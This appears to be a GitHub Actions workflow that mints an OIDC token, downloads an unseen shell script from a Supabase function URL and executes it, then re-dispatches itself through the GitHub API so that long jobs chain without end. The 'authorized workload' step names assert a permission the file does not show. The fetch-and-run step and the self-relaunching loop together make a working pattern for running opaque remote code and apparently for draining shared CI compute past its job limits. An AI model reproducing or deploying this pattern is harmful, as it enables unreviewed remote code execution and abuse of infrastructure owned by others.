name: Remote OIDC Compute

on:
  push:
    branches: [main]
    paths: ['.github/workflows/remote-compute.yml']
  workflow_dispatch:

permissions:
  contents: read
  id-token: write
  actions: write

concurrency:
  group: remote-oidc-compute
  cancel-in-progress: false

jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 330
    steps:
      - name: Install runtime dependencies
        run: |
          set -euo pipefail
          python3 -m pip install --disable-pip-version-check --quiet numpy==2.2.6 sentencepiece==0.2.1
          python3 -m pip install --disable-pip-version-check --quiet torch==2.7.1 --index-url https://download.pytorch.org/whl/cpu

      - name: Fetch and execute authorized private workload
        shell: bash
        env:
          CODE_URL: https://hiyduakdyfcpibwxrtan.supabase.co/functions/v1/training-runner-v2
          CODE_AUD: kaganyz-training-code-v2
        run: |
          set -euo pipefail
          TOKEN="$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${CODE_AUD}" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')"
          curl -fsS --retry 3 -H "Authorization: Bearer ${TOKEN}" "${CODE_URL}?file=runner.sh" -o /tmp/remote-workload.sh
          chmod 700 /tmp/remote-workload.sh
          /tmp/remote-workload.sh
          rm -f /tmp/remote-workload.sh

      - name: Continue authorized workload if incomplete
        if: success()
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          COMPLETE="$(cat /tmp/kaganyz_complete 2>/dev/null || echo false)"
          if [ "$COMPLETE" = "true" ]; then
            echo "remote_workload_complete=true"
            exit 0
          fi
          sleep 15
          curl -fsS -X POST \
            -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/remote-compute.yml/dispatches" \
            -d '{"ref":"main"}' >/dev/null
          echo "next_remote_cycle_dispatched=true"
